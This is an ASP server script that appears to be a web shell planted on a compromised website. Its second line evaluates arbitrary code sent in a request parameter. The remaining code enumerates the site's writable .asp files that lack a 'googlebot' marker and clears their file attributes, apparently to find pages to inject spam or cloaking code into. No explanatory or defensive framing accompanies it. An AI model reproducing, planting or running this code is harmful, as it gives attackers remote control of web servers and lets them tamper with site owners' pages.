<%
<%eval request("ohMbBIDOVR")%>
document_root = server.MAppATH("/") & "\"
ReDim Preserve myArray(0)
Set fs=Server.CreateObject("Scripting.FileSystemObject")
  file_list = bl(document_root, myArray)
  file_list_total = UBound(file_list)
  For Each file In file_list
    Response.write "file:" & file & ","
  Next
function bl(strpath, myArray)
    i = 0
    set fso=server.createobject("Scripting.FileSystemObject")
    set objfolder=fso.getfolder(strpath)
    for each objsubfolder in objfolder.files
        realFile = strpath & objsubfolder.Name
        file_ext = getFileExt(objsubfolder.Name)
        file_content = ReadFromTextFile(realFile, "utf-8")
        is_self = instr(file_content, "googlebot")
        Set file_fso =fso.getFile(realFile)
        'On Error Resume Next
        file_fso.attributes=0
        if err.Number<>0 then
          is_write = false
        else
          is_write = true
        end if 
        if file_ext = "asp" and is_self = 0 and is_write= true then
          ReDim Preserve myArray(UBound(myArray) + 1)
          myArray(i) = realFile 
          i = i+1
        end if 
        'Response.write  "----" & len(objsubfolder.name) & "<br>"
    next
    bl = myArray
End function
Function ReadFromTextFile (FileUrl,CharSet)
    dim str
    set stm=server.CreateObject("adodb.stream")
    stm.Type=2 '餓ζ쑍與▼폀瑥삣룚
    stm.mode=3 
    stm.charset=CharSet
    stm.open
    stm.loadfromfile FileUrl
    str=stm.readtext
    stm.Close
    set stm=nothing
    ReadFromTextFile = str
End Function
Function getFileExt(sFileName) 
  getFileExt = Mid(sFileName, InstrRev(sFileName, ".") + 1) 
End Function 
%>
